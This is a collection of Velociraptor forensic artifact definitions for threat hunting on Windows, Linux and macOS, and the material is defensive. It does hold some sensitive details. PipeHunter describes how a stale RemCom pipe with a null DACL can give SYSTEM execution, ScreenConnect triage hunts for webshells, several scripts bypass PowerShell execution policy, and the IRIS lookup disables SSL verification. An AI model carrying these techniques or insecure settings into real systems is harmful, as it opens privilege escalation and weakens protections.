                                if(condition= String.Offset + ContextBytes > File.Size,
                                    then= File.Size,
                                    else= String.Offset + ContextBytes) ]
                            )) as HitContext
                FROM yara(rules=yara_rules, files=OSPath, context=ContextBytes,number=NumberOfHits)
            })

      -- upload files that have hit
      LET upload_hits=SELECT *,
            upload(file=OSPath) AS Upload
        FROM hits
        GROUP BY OSPath

      -- return rows
      SELECT * FROM if(condition=UploadYaraHits,
        then={ SELECT * FROM upload_hits},
        else={ SELECT * FROM hits})

  - name: Evtx
    query: |
      LET EvtxIPs <= SELECT _value as IP FROM foreach(row=split(string=IpEvtxIoc,sep='\\s')) WHERE _value
      LET EvtxHunterRegex = strip(string=join(array=EvtxIPs.IP + dict(Ioc=IocRegex).Ioc, sep='|'), suffix='|',prefix='|')
      LET Parse(X) = to_dict(
        item={
           SELECT split(sep=":", string=Column0)[0] AS _key,
                  regex_replace(re="^\\s+|\\s+$", replace="", source=split(sep=":", string=Column0)[1]) AS _value
           FROM split_records(accessor="data", filenames=X, regex="\r\n")
           WHERE Column0 =~ "^[a-zA-Z0-9]+:"
        }) +  parse_string_with_regex(regex="User '(?P<User>[^']+)'", string=X)

      SELECT EventTime,Computer,Channel,Provider,EventID,EventRecordID,
        Parse(X=split(string=EventData.Data[0],sep="\r\n\r\n")[1]) as EventData,
        split(string=EventData.Data[0],sep="\r\n\r\n")[0] as Message,
        FullPath,
        EventData.Data[0] as _RawData
      FROM Artifact.Windows.EventLogs.EvtxHunter(
                        IocRegex=EvtxHunterRegex,
                        WhitelistRegex=IgnoreRegex,
                        DateAfter=DateAfter,
                        DateBefore=DateBefore )
      WHERE EventData.IPAddress in EvtxIPs.IP OR _RawData =~ IocRegex

column_types:
  - name: HitContext
    type: preview_upload
  - name: ModTime
    type: timestamp
  - name: EventTime
    type: timestamp

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.UnifiedLogHunter.yaml
======
name: MacOS.UnifiedLogHunter
description: |
        This artifact allows for live hunting through Apple's Unified Logs using the native `log` command.

        The Unified Logs can be a great resource for learning about system events. There are many logging subsystems that can provide a wealth of data for investigators.

        However, users should ensure their searches are scoped appropriately (date/time/event type/etc), as a lot of data can be returned, which could affect the ability to review the collected data or potentially impact client performance.

        The `Predicate` parameter can be used to filter logs. Example filters are included as artifact parameters.

        Users may need to adjust the `Length` parameter to accomodate a large number of events being returned.

        If you would like to perform an offline collection, or only care about collecting the raw files associated with this data, consider using [Exchange.MacOS.UnifiedLogParser](https://docs.velociraptor.app/exchange/artifacts/pages/macos.unifiedlogparser/).
reference:
  - https://github.com/jamf/jamfprotect/tree/main/unified_log_filters
  - https://www.mandiant.com/resources/blog/reviewing-macos-unified-logs
  - https://skartek.dev/2022/05/04/unified-logging-for-macos-an-introduction/
  - https://www.crowdstrike.com/blog/how-to-leverage-apple-unified-log-for-incident-response/
  - https://devstreaming-cdn.apple.com/videos/wwdc/2016/721wh2etddp4ghxhpcg/721/721_unified_logging_and_activity_tracing.pdf
type: CLIENT
author: Wes Lambert - @therealwlambert|@weslambert@infosec.exchange
parameters:
  - name: StartDate
    type: timestamp
  - name: EndDate
    default:
    type: timestamp
  - name: Predicate
    description: Use a custom filter
    default:
    type: string
  - name: RunAllQueries
    description: Run all preconfigured filters.  You may need to increase the default timeout of 600s.
    type: bool
  - name: Configuration Profile - Manual Install
    description: Look for manual install of a configuration profile
    type: bool
  - name: Configuration Profile - Manual Removal
    description: Look for anual removal of a configuration profile
    type: bool
  - name: DNS configuration changes
    description: Look for modifications made to host DNS settings
    type: bool
  - name: Failed Lock Screen Unlock
    description: Look for failures to unlock the lock screen
    type: bool
  - name: Failed Local Password Login
    description: Look for failures for local logins using a password
    type: bool
  - name: Successful Local Password Login
    description: Look for successful logins using a password
    type: bool
  - name: Failed Local TouchID Login
    description: Look for local TouchID logins
    type: bool
  - name: Failed sudo access
    description: Look for failed usage of 'sudo'
    type: bool
  - name: Gatekeeper File Access Rejections and User Bypasses
    description: Look for Gatekeeper file access rejections and user bypasses
    type: bool
  - name: Gatekeeper File Access Scan Activity
    description: Look for Gatekeeper file access scan activity
    type: bool
  - name: Inbound screen sharing
    description: Look for inbound screen sharing
    type: bool
  - name: Kernel Extension Additions
    description: Look for changes made to kernel extensions
    type: bool
  - name: Keychain DB Unlock
    description: Look for keychain database unlock attempts
    type: bool
  - name: Permissions and Access Violations
    description: Looks for TCC permisssions and access violations
    type: bool
  - name: Session Creation and Destruction
    description: Looks for session creation and Destruction
    type: bool
  - name: SSH Login Activity
    description: Look for SSH login failures and successes
    type: bool
  - name: Successful Local TouchID Login
    description: Look for successful TouchID logins
    type: bool
  - name: Sudo access
    type: bool
    description: Look for general 'sudo' usage
  - name: MDM Profile - Manual Removal
    type: bool
    description: Look for the removal of MDM profiles
  - name: Network server connection attempts inbound
    type: bool
    description: Look for inbound network connection attempts
  - name: Root user enabled or password changed
    type: bool
    description: Look for changes to the root user configuration
  - name: XProtect Remediator scanning activity
    type: bool
    description: Look for XProtect scanning activity
  - name: Length
    type: int
    default: 10000000
required_permissions:
  - EXECVE
precondition: SELECT OS From info() where OS = 'darwin' AND StartDate AND EndDate
sources:
  - query: |
      LET QueryTable = SELECT * FROM parse_csv(accessor="data", filename='''
            QueryName,Q
            Airdrop Transfer Outbound,subsystem == "com.apple.sharing" AND process == "AirDrop" AND processImagePath BEGINSWITH "/System/Library" AND eventMessage BEGINSWITH "Successfully issued sandbox extension for"
            Application Firewall Logging,subsystem == "com.apple.alf"
            Configuration Profile - Manual Install,subsystem == "com.apple.ManagedClient" AND process == "mdmclient" AND category == "MDMDaemon" and eventMessage CONTAINS "Installed configuration profile:" AND eventMessage CONTAINS "Source: Manual"
            Configuration Profile - Manual Removal,subsystem == "com.apple.ManagedClient" AND process == "mdmclient" AND category == "MDMDaemon" and eventMessage CONTAINS "Removed configuration profile:" AND eventMessage CONTAINS "Source: Manual"
            DNS configuration changes,subsystem == "com.apple.networkextension" and process == "nehelper" and eventMessage CONTAINS "DNS settings are enabled" OR subsystem == "com.apple.networkextension" and process == "nesessionmanager" and eventMessage contains "status changed to disconnected, last stop reason Configuration was disabled"'
            Gatekeeper File Access Rejections and User Bypasses,subsystem == "com.apple.launchservices" AND process == "CoreServicesUIAgent" AND category == "uiagent" AND (eventMessage BEGINSWITH "Saving rejection record:" OR eventMessage CONTAINS "Gatekeeper rejection record")
            Gatekeeper File Access Scan Activity,subsystem == "com.apple.syspolicy.exec" AND process == "syspolicyd" AND category == "default"
            Failed Lock Screen Unlock,processImagePath BEGINSWITH "/System/Library/CoreServices" AND process == "loginwindow" AND eventMessage CONTAINS[c] "INCORRECT"
            Failed Local Password Login,processImagePath BEGINSWITH "/System/" AND process == "SecurityAgent" AND subsystem == "com.apple.loginwindow" AND eventMessage CONTAINS "Authentication failure"
            Failed Local TouchID Login,process == "loginwindow" AND eventMessage CONTAINS[c] "APEventTouchIDNoMatch"
            Failed Local User Password Change,subsystem == "com.apple.opendirectoryd" AND process == "opendirectoryd" AND category == "auth" AND eventMessage CONTAINS "Failed to change password"
            Failed sudo access,process == "sudo" AND eventMessage CONTAINS[c] "TTY" AND eventMessage CONTAINS[c] "3 incorrect password attempts"
            Inbound screen sharing,process == "screensharingd" AND eventMessage BEGINSWITH "Authentication: "
            Kernel Extension Additions,process == "kextd" && sender == "IOKit"
            Keychain DB Unlock,process == "loginwindow" && sender == "Security"
            MDM Profile - Manual Removal,subsystem == "com.apple.ManagedClient" AND eventMessage CONTAINS "Removed configuration profile: MDM Profile" AND eventMessage CONTAINS "Source: Manual"
            Network server connection attempts inbound,process == "NetAuthSysAgent" AND subsystem == "com.apple.NetAuthAgent" AND category == "IPC" AND eventMessage BEGINSWITH "URL = "
            Permissions and Access Violations,process == "tccd"
            Root user enabled or password changed,processImagePath == "/usr/libexec/opendirectoryd" AND process == "opendirectoryd" AND subsystem == "com.apple.opendirectoryd" AND eventMessage CONTAINS "Password changed for root"
            Session Creation and Destruction,process == "securityd" && eventMessage CONTAINS "Session"  && subsystem == "com.apple.securityd"
            SSH Login Activity,process == "sshd"
            Successful Local Password Login,processImagePath BEGINSWITH "/System/Library/CoreServices" AND process == "loginwindow" AND subsystem == "com.apple.loginwindow.logging" AND eventMessage CONTAINS "[Login1 doLogin] | shortUsername"
            Successful Local TouchID Login,process == "loginwindow" AND eventMessage CONTAINS[c] "APEventTouchIDMatch"
            Successful Local User Password Change,subsystem == "com.apple.opendirectoryd" AND process == "opendirectoryd" AND category == "auth" AND eventMessage CONTAINS "Password changed for"
            XProtect Remediator scanning activity,subsystem == "com.apple.XProtectFramework.PluginAPI" && category == "XPEvent.structured"''')

      LET QueriesToRun <= SELECT Q FROM QueryTable WHERE if(condition=RunAllQueries, then=QueryName, else=get(field=QueryName))

      LET Raw <= SELECT * FROM foreach(row={ SELECT * FROM chain( a=QueriesToRun, b=if(condition=Predicate, then={ SELECT Predicate AS Q FROM scope()}))},
                                       query={ SELECT Stdout FROM execve(
                   length=Length,
                   argv=[
                     "log",
                     "show",
                     "--start",
                     grok(grok="%{TIMESTAMP_ISO8601:Date}", data=StartDate).Date,
                     "--end",
                     grok(grok="%{TIMESTAMP_ISO8601:Date}", data=EndDate).Date,
                     "--predicate",
                     Q,
                     "--style",
                     "json"])}, async=TRUE) WHERE NOT Stdout = "[]"
      SELECT
        timestamp(string=get(member="timestamp")) AS EventTime,
        get(member="machTimestamp") AS _TimeSinceBoot,
        get(member="traceID") AS _TraceID,
        get(member="eventMessage") AS EventMessage,
        get(member="eventType") AS EventType,
        get(member="messageType") AS MessageType,
        get(member="category") AS Category,
        get(member="subsystem") AS Subsystem,
        get(member="processID") AS PID,
        get(member="processImagePath") AS ProcessImagePath,
        get(member="processImageUUID") AS ProcessImageUUID,
        get(member="senderImagePath") AS SenderImagePath,
        get(member="senderImageUUID") AS SenderImageUUID,
        get(member="senderProgramCounter") AS SenderProgramCounter,
        get(member="source") AS _Source,
        get(member="formatString") AS _FormatString,
        get(member="activityIdentifier") AS ActivityID,
        get(member="parentActivityIdentifier") AS ParentActivityID,
        get(member="threadID") AS _ThreadID,
        get(member="backtrace") AS _Backtrace,
        get(member="bootUUID") AS _BootUUID,
        get(member="timezoneName") AS _TimezoneName
      FROM foreach(row=Raw.Stdout, query={SELECT * FROM parse_json_array(data=_value)})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Detection.PipeHunter.yaml
======
name: Windows.Detection.PipeHunter
author: ACEResponder.com
description: |
   Takes a pipe name and returns the owning process and access rights. The primary
   motivation for this artifact is a vulnerability in RemCom. RemCom is most 
   notably used by impacket psexec.py. It creates a null DACL for its 
   communication pipe. This means a low privileged user
   could use a stale pipe to get remote execution as SYSTEM. If you uncover any
   named pipes with the name RemCom_communication, investigate the owning proc
   and remove it from the system.
   #impacket

reference:
  - https://twitter.com/bugch3ck

parameters:
  - name: pipe_name
    default: "RemCom_communicaton"

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
        LET ps = '''Add-Type -TypeDefinition  @"
            using System;
            using System.Diagnostics;
            using System.Runtime.InteropServices;
        
            public static class Kernel32
            {
                [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
                public static extern IntPtr CreateFile(
                      string filename,
                      System.IO.FileAccess access,
                      System.IO.FileShare share,
                      IntPtr securityAttributes,
                      System.IO.FileMode creationDisposition,
                      uint flagsAndAttributes,
                      IntPtr templateFile);
                [DllImport("kernel32.dll", SetLastError = true)]
                public static extern bool GetNamedPipeServerProcessId(IntPtr hPipe, out int ClientProcessId);
            
                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern bool CloseHandle(IntPtr hObject);
            }
        "@
        $remcom=$null
        $pipeOwner=0

        try {
          #gci directly on the pipe does not work in some versions of posh for some reason
          $remcom = Get-ChildItem -ErrorAction Stop \\.\pipe\ -Filter '''
        LET ps2='''
          $output = New-Object PSObject -Property @{
            ProcessId         = $null;
            ProcessName       = $null;
            NamedPipe         = $remcom.FullName;
            AccessControlType = $null;
            IdentityReference = $null;
          }
          try {
            $acl = $remcom.GetAccessControl();
            $output.AccessControlType = $acl.Access.AccessControlType;
            $output.IdentityReference = $acl.Access.IdentityReference.Value;
          }
          catch {
          }
          $hPipe = [Kernel32]::CreateFile($remcom.FullName, [System.IO.FileAccess]::Read, [System.IO.FileShare]::None, [System.IntPtr]::Zero, [System.IO.FileMode]::Open, [System.UInt32]::0x80, [System.IntPtr]::Zero);
          $pipeOwnerFound = [Kernel32]::GetNamedPipeServerProcessId([System.IntPtr]$hPipe, [ref]$pipeOwner);
          if ($pipeOwnerFound) {
            # Now that we have the process id, Get process name
            $processName = Get-WmiObject -Query "SELECT Caption FROM Win32_Process WHERE ProcessID = $pipeOwner" | select -ExpandProperty Caption;
                    
            # Add to the name and ID to output
            $output.ProcessID = $pipeOwner;
            $output.ProcessName = $processName;
        
          }
          if($output.NamedPipe){
            $output | ConvertTo-JSON
          }
          #close the handle to the pipe
          $closed = [Kernel32]::CloseHandle($hPipe);
        
        }
        catch {
          write-host $_;
        }
        
        '''

        SELECT * FROM execve(argv=["Powershell", "-ExecutionPolicy",
            "unrestricted", "-c", ps+pipe_name+ps2])    

---END OF FILE---

======
FILE: /content/exchange/artifacts/Volatility_profile.yaml
======
name: Linux.Volatility.Create.Profile
author: URCA (Corentin Garcia / Emmanuel Mesnard)
description: |
  This artifact is used to create the profile to the environnements Debian / Ubuntu.


required_permissions:
  - EXECVE

tools:
  - name: Volatility
    url: https://github.com/volatilityfoundation/volatility/archive/master.zip

parameters:
    - name: Zipname
      type: string
      default: Ubuntu
      
precondition: SELECT OS From info() where OS = 'linux'

sources:
  - queries:
    - LET dirtmp = tempdir(remove_last=true)
    
      LET vola = SELECT * FROM execve(argv=['bash', '-c', 'mv /tmp/master.zip /tmp/volatility-master.zip ; cd /tmp/ ; apt install -y dwarfdump zip unzip ; unzip -o /tmp/volatility-master.zip -d /tmp/  ; cd /tmp/volatility-master/tools/linux/ ; make clean ; make ; zip /tmp/' + Zipname + '.zip /tmp/volatility-master/tools/linux/module.dwarf /boot/System.map-$(uname -r)'])
    
      SELECT * FROM foreach(
          row={
            SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="Volatility")
          },
          query={
            SELECT * FROM chain(
                a={SELECT *, if(condition=Complete, then=upload(file="/tmp/" + Zipname + ".zip", name=Zipname + ".zip")) As Upload FROM vola},
                b={SELECT * FROM execve(argv=['bash', '-c', 'mv /tmp/volatility-master /tmp/volatility-master.zip /tmp/' + Zipname + '.zip ' + dirtmp])})
          })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Applications.Docker.Ps.yaml
======
name: Linux.Applications.Docker.Ps
author: Ján Trenčanský - j91321@infosec.exchange
description: Get Docker containers by connecting to the docker.socket. Same as running `docker ps`
reference:
  - https://docs.docker.com/engine/api/v1.45/#tag/Container/operation/ContainerList

parameters:
  - name: dockerSocket
    description: |
      Docker server socket. You will normally need to be root to connect.
    default: /var/run/docker.sock
  - name: all
    description: |
        Show non-running containers. Equals to `docker ps -a`.
    type: bool
    default: N
sources:
  - precondition: |
      SELECT OS From info() where OS = 'linux'
    query: |
        LET running_containers = SELECT parse_json_array(data=Content) as JSON FROM http_client(url=dockerSocket + ":unix/containers/json")
        LET all_containers = SELECT parse_json_array(data=Content) as JSON FROM http_client(url=dockerSocket + ":unix/containers/json", params=dict(all=True))
        SELECT * FROM foreach(
            row={
                SELECT * FROM if(
                    condition=all,
                    then=all_containers,
                    else=running_containers
                )
            },
            query={
                SELECT * FROM JSON
            }
        )
---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Collection.Kthread.yaml
======
name: Linux.ExtractKthread
author: Andy Swift
description: |
  This artifact parses `/proc/[0-9]*/status` files and extracts the `ProcessName` and `Kthread` values. Helpful for identifying imposter processes.

type: CLIENT

precondition: SELECT OS FROM info() WHERE OS = "linux"

parameters:
  - name: FileNameGlob
    description: Glob pattern to search for process status files.
    default: "/proc/[0-9]*/status"
    type: str

sources:
- name: extractKthread
  query: |
    LET FileInfos <= SELECT OSPath, read_file(filename=OSPath) AS content
                     FROM glob(globs=FileNameGlob, accessor='file')
                     WHERE content =~ 'Kthread:\\s*(\\d+)'

    LET ParsedInfos <= SELECT OSPath,
                          parse_string_with_regex(
                            string=content,
                            regex=[
                              '^Name:\\s*(?P<Name>.+)',
                              'Kthread:\\s*(?P<KthreadValue>\\d+)'
                            ]
                          ) AS ParsedContent
                      FROM FileInfos

    SELECT OSPath,
           ParsedContent.Name AS ProcessName,
           ParsedContent.KthreadValue AS Kthread
    FROM ParsedInfos

---END OF FILE---

======
FILE: /content/exchange/artifacts/Generic.Detection.LunasecLog4shell.yaml
======
name: Generic.Detection.LunasecLog4shell
author: "Marinus Boekelo & Noël Keijzer - Northwave CERT"
description: |
  Uses the Log4Shell scanner of Lunasec to scan the file systems of
  all drives of the host for any sign of vulnerabilities related to
  Log4shell

tools:
  - name: log4shell_linux_amd64
    github_project: lunasec-io/lunasec
    github_asset_regex: Linux_x86_64
    serve_locally: true

  - name: log4shell_linux_x86
    github_project: lunasec-io/lunasec
    github_asset_regex: Linux_i386
    serve_locally: true

  - name: log4shell_windows_amd64
    github_project: lunasec-io/lunasec
    github_asset_regex: Windows_x86_64
    serve_locally: true

  - name: log4shell_windows_x86
    github_project: lunasec-io/lunasec
    github_asset_regex: Windows_i386
    serve_locally: true

reference:
  - https://github.com/lunasec-io/lunasec/releases/

precondition: SELECT OS From info() where OS = "windows" or OS = "linux"

required_permissions:
  - EXECVE

parameters:
  - name: ToolInfo
    description: Override Tool information.

sources:
  - query: |
      LET os_info <= SELECT Architecture, OS FROM info()

      // Get the path to the binary.
      LET bin <= SELECT * FROM Artifact.Generic.Utils.FetchBinary(
              ToolName= "log4shell_" + os_info[0].OS + "_" + os_info[0].Architecture,
              ToolInfo=ToolInfo)

      // Select the Disks to scan
      LET disks = if(condition=(os_info[0].OS="windows"),
            then= {
                SELECT Mountpoint + "\\\\" as Mountpoint
                FROM filesystems()
            },
            else={
                SELECT "/" as Mountpoint
                FROM scope()
            })

      // Scan every disk
      LET results = SELECT * FROM foreach(row=disks,
            query={
                SELECT parse_json(data=Stdout) AS record
                FROM execve(argv=[bin[0].FullPath,"scan","--json",Mountpoint], sep="\n")
                WHERE Stdout
            })

      // output rows
      SELECT * FROM foreach(row= results,
        query={ SELECT * FROM record })

---END OF FILE---

======
FILE: /content/exchange/artifacts/DIEC.yaml
======
name: Windows.Applications.DIEC
description: |
    Execute DetectItEasy (console version) on specified paths and
    return rows of results to hunt/filter on binaries based types of
    files (E.g.: Packed binaries and its packers)

author: Eduardo Mattos - @eduardfir

reference:
  - https://github.com/horsicq/Detect-It-Easy

type: CLIENT

tools:
  - name: DIEC
    url: https://github.com/horsicq/DIE-engine/releases/download/3.03b/die_win64_portable_3.03.zip

precondition: SELECT OS From info() where OS = 'windows'

parameters:
  - name: TargetGlob
    default: C:\Users\**\*.{exe,dll}

  - name: EntropyScan
    type: bool

sources:
  - query: |
        -- preparation
        LET Toolzip <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="DIEC", IsExecutable=FALSE)
        LET TmpDir <= tempdir(remove_last=TRUE)
        LET UnzipIt <= SELECT * FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)

        LET Targets <= SELECT FullPath FROM glob(globs=TargetGlob)

        -- execute DIEC
        LET ExecDIEC <= SELECT * FROM if(condition=EntropyScan,
                        then={ -- execute EntropyScan
                            SELECT * FROM foreach(row=Targets,
                                query={
                                    SELECT parse_json(data=Stdout) as DiecOutput, FullPath
                                    FROM execve(argv=[
                                        TmpDir + "/die_win64_portable/diec.exe",
                                        "-e",
                                        "-j",
                                        FullPath])
                                })
                        },
                        else={ -- execute DeepScan
                            SELECT * FROM foreach(row=Targets,
                                query={
                                    SELECT parse_json(data=Stdout) as DiecOutput, FullPath
                                    FROM execve(argv=[
                                        TmpDir + "/die_win64_portable/diec.exe",
                                        "-d",
                                        "-j",
                                        FullPath])
                                })
                        })

        -- format the output according to selected scan type
        SELECT * FROM if(condition=EntropyScan,
            then={
                SELECT
                    DiecOutput.records as Records,
                    DiecOutput.status as Status,
                    DiecOutput.total as Entropy,
                    FullPath
                FROM ExecDIEC
            },
            else={
                SELECT
                    dict(Arch=DiecOutput.arch,
                    Endianess=DiecOutput.endianess,
                    FileType=DiecOutput.filetype,
                    Mode=DiecOutput.mode,
                    Type=DiecOutput.type) as PEInfo,
                    DiecOutput.detects as Detects,
                    FullPath
                FROM ExecDIEC
            })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Exports.yaml
======
name: Windows.Binary.Exports
author: Matt Green - @mgreen27
description: |
   This artifact can be used to extract all binary exports to research
   potential lolbins.  Selecting the AllBinaryInfo tickbox will return
   complete Binary information.

type: CLIENT

parameters:
  - name: TargetGlob
    default: C:/ProgramData/*
    description: Glob to target
  - name: AllBinaryInfo
    type: bool
    description: Select to extract all binary info

sources:
  - query: |
      Let Targets = SELECT * FROM glob(globs=TargetGlob)
        WHERE NOT IsDir

      LET all_binary_info = SELECT
            dict(OSPath=OSPath,Name=Name,Size=Size,IsLink=IsLink) as FileDetails,
            dict(Mtime=Mtime,Atime=Atime,Ctime=Ctime,Btime=Btime) as SI,
            parse_pe(file=OSPath) as BinaryInfo,
            authenticode(filename=OSPath) as Authenticode,
            hash(path=OSPath) as Hash
          FROM Targets
          WHERE BinaryInfo

      LET binary_exports = SELECT
            dict(OSPath=OSPath,Name=Name,Size=Size,IsLink=IsLink) as FileDetails,
            parse_pe(file=OSPath).Exports as Exports
          FROM Targets
          WHERE Exports

      SELECT * FROM if(condition=AllBinaryInfo,
            then=all_binary_info,
            else=binary_exports)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.Threatfox.yaml
======
name: Server.Enrichment.ThreatFox
description: |
     Query ThreatFox for an indicator.

     To learn more about ThreatFox, see: https://threatfox.abuse.ch

     This artifact can be called from within another artifact to enrich the data made available by that artifact.

     Ex.

       `SELECT * from Artifact.Server.Enrichment.ThreatFox(AuthKey=$YOURKEY,IOC=$YOURIOC)`

     If querying for an MD5 or SHA256 hash, specify the IOC type, like so:
  
       `SELECT * from Artifact.Server.Enrichment.ThreatFox(AuthKey=$YOURKEY,IOCType=Hash)`

type: SERVER

parameters:
   - name: AuthKey
     default:
   - name: IOC
     default:
   - name: IOCType
     default:
     type: choices
     choices:
      - 
      - IOC
      - Hash

sources:
    - query: |
       LET TFURL <= "https://threatfox-api.abuse.ch/api/v1/"
       LET TFIOC = 
         SELECT *
           FROM http_client(
             method="POST",
             url=TFURL,
             headers=dict(`Auth-Key`=AuthKey),
             data=serialize(item=dict(`query`="search_ioc",`search_term`=IOC))
       )
       
       LET TFHash = 
         SELECT *
           FROM http_client(
             method="POST",
             url=TFURL,
             headers=dict(`Auth-Key`=AuthKey),
             data=serialize(item=dict(`query`="search_hash", `hash`=IOC))
       )
       
       SELECT 
              parse_json(data=Content).data[0].ioc AS `IOC`,
              parse_json(data=Content).data[0].malware AS `Malware`,
              parse_json(data=Content).data[0].confidence_level AS `Confidence Level`,
              parse_json(data=Content).data[0].threat_type AS `Threat Type`,
              parse_json(data=Content).data[0].first_seen AS `First Seen`,
              parse_json(data=Content).data[0].last_seen AS `Last Seen`,
              parse_json(data=Content).data[0].reporter AS `Reporter`,
              parse_json(data=Content).data[0].tags AS `Tags`,
              parse_json(data=Content).data[0] As _Content 
       FROM if(condition= IOCType=~"Hash",then=TFHash,else=TFIOC)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.System.AccessControlList.yaml
======
name: Windows.System.AccessControlList
description: |
   This artifact displays the access control lists of files.

   Note: This artifact uses Powershell to gather the information.

type: CLIENT

parameters:
   - name: Glob
     description: A search expression that will be passed to Powershell
     default: C:\Windows\System32\Config\s*
   - name: ACLFilter
     description: Only show files with ACLs that match this regex.
     default: BUILTIN\\Users.+Allow

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows' OR OS = 'linux' OR OS = 'darwin'

    query: |
        LET Script <= tempfile(data='''
        $glob = $args[0]
        Get-Acl $glob | select Path, Owner, Group, AccessToString | convertto-json
        ''', extension=".ps1")

        LET Results = SELECT parse_json_array(data=Stdout) AS Rows
           FROM execve(argv=["powershell", "-executionpolicy",
               "bypass", "-file", Script, Glob], length=100000)

        SELECT * FROM foreach(row=Results.Rows,
        query={
            SELECT parse_string_with_regex(string=Path, regex="FileSystem::(.+)").g1 AS Path,
                   Owner, Group, split(string=AccessToString, sep="\n") AS ACLS
            FROM _value
        })
        WHERE ACLS =~ ACLFilter

---END OF FILE---

======
FILE: /content/exchange/artifacts/ScreenConnect.yaml
======

name: Windows.Triage.ScreenConnect
author: Matt Green - @mgreen27 - Rapid7 Labs
description: |
   This artifact extracts useful data for triage of ConnectWise ScreenConnect
   CVE-2024-1709 and CVE-2024-1708 impacting versions 23.9.7 and prior.
   
   This artifact will:   
   
   1. Check for Webshells in ```/App_Extensions/**/*.{aspx,ashx}``` path.  
   Some observed legitimate webapp strings have been excluded.   
   NOTE: Use WebshellsUSN to find potential exploits that cleanup shells.   
   
   2. Parse ```C:\Program Files\ScreenConnect\App_data\User.Xml``` file.   
   Usually this file is set during first use and reset during exploit. 
   Check for timestamp discrepancies and obviously evil usernames/email 
   (@poc.com).  
   
   3. Parse ```security.db```.   
   Add time filter. Results are stacked, check for unusual access patterns 
   and malicious IPs.
   
   4. List and upload (optionally) all ScreenConnect files.
   
   Collect additional artifacts as desired for support.

reference:
    - https://www.rapid7.com/blog/post/2024/02/20/etr-high-risk-vulnerabilities-in-connectwise-screenconnect/
   
type: CLIENT

parameters:
   - name: TargetGlob
     default: "C:/Program Files*/**/ScreenConnect/**"
     description: Glob for all files under ScreenConnect program files
   - name: ExcludedWebshellStrings
     description: Excluded webshell strings.
     default: ScreenConnect
   - name: DateAfter
     description: Search for security events after this date 
     type: timestamp
     default: "2024-02-20"
   - name: DateBefore
     description: Search for security events before this date 
     type: timestamp
   - name: UploadFiles
     description: If selected Upload all ScreenConnect files for review
     type: bool


precondition: SELECT OS From info() where OS = 'windows'
sources:
  - name: Webshells
    query: |
      LET shells = SELECT OSPath, Mtime,Atime,Ctime,Btime 
        FROM glob(globs=TargetGlob + "/App_Extensions/**/*.{aspx,ashx}")
        WHERE NOT IsDir
      
      SELECT * FROM foreach(row=shells, query={
        SELECT 
            OSPath,
            dict(
                Mtime=Mtime,
                Atime=Atime,
                Ctime=Ctime,
                Btime=Btime ) as Timestamps,
            read_file(filename=OSPath) as Contents
        FROM scope()
        WHERE NOT if(condition=ExcludedWebshellStrings,
                        then= Contents=~ExcludedWebshellStrings,
                        else= False )
      })
      
  - name: WebshellsUsn
    query: |
      SELECT Timestamp,OSPath,Reason,MFTId,Sequence,ParentMFTId,ParentSequence,Usn
      FROM Artifact.Windows.Forensics.Usn(
                        FileNameRegex='\.(aspx|ashx)$',
                        PathRegex='ScreenConnect.+App_Extensions',
                        DateAfter=DateAfter,
                        DateBefore=DateBefore )

  - name: UserXml
    query: |
      SELECT 
        OSPath, 
        dict(
            Mtime=Mtime,
            Atime=Atime,
            Ctime=Ctime,
            Btime=Btime ) as FileTimestamps,
        parse_xml(file=OSPath).Users.User as UserXml
      FROM glob(globs=TargetGlob + '/user.xml')


  - name: SecurityEvents
    query: |
      LET MaxDate <= if(condition= DateBefore, then=DateBefore, else= '2030-01-01')
      
      LET db = SELECT OSPath, Mtime,Atime,Ctime,Btime 
        FROM glob(globs=TargetGlob + '/security.db')
      
      LET sqlquery = "SELECT * FROM SecurityEvent"
      
      LET results = SELECT * FROM foreach(row=db,query= {
            SELECT * FROM sqlite(file=OSPath,query=sqlquery)
            WHERE Time > DateAfter AND Time < MaxDate
        })

      SELECT 
        EventType,
        OperationResult,
        ip(netaddr4_be=int(
            int=format(format='0x%x',args=NetworkAddress))) AS NetworkAddress,
        UserAgent,
        UserSource,
        UrlReferrer,
        UserName,
        min(item=Time) AS Earliest,
        max(item=Time) AS Latest,
        count() AS Total
      FROM results
      GROUP BY UserAgent, UserSoure, UrlReferrer, UserName

  - name: Files
    query: |
        LET TargetGlobs = (
                "C:/Windows/Temp/ScreenConnect*/**",
                "C:/Program Files/ScreenConnect*/**",
                "C:/Program Files (x86)/ScreenConnect*/**",
                "C:/ProgramData/ScreenConnect*/**",
                "C:/Users/*/Documents/ConnectWiseControl/**" )
        SELECT * 
        FROM Artifact.Windows.Search.FileFinder(
                            Upload_File=UploadFiles,
                            SearchFilesGlob=TargetGlobs )

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.IRIS.IOCLookup.yaml
======
name: Server.Enrichment.IRIS.IOCLookup
description: |
     Query an IRIS instance for an indicator.

     To learn more about IRIS, see: https://dfir-iris.org/

     This artifact can be called from within another artifact to enrich the data made available by that artifact.
     
     NOTE: This artifact queries for all IOCs, and does not associate IOCs to first-order cases. This will be improved in the future.

     Ex.

       `SELECT * from Artifact.Server.IRIS.IOCLookup(IOC=$YOURIOC)`

type: SERVER

parameters:
   - name: IOC
     default:
   - name: IrisURL
     default: https://myiris
   - name: IrisKey
     type: string
     description: API key for DFIR-IRIS. Leave blank here if using server metadata store.
     default:
sources:
    - query: |
       LET URL = if(
           condition=IrisURL,
           then=IrisURL,
           else=server_metadata().IrisURL)
       
       LET Creds = if(
           condition=IrisKey,
           then=IrisKey,
           else=server_metadata().IrisKey)
       
       LET Data = SELECT parse_json(data=Content).data.ioc AS IOCs FROM http_client(
         method="GET", 
         url=URL + '''/case/ioc/list''',
         headers=dict(`Content-Type`="application/json", `Authorization`='''Bearer ''' + Creds),
         disable_ssl_security=true
       )
       
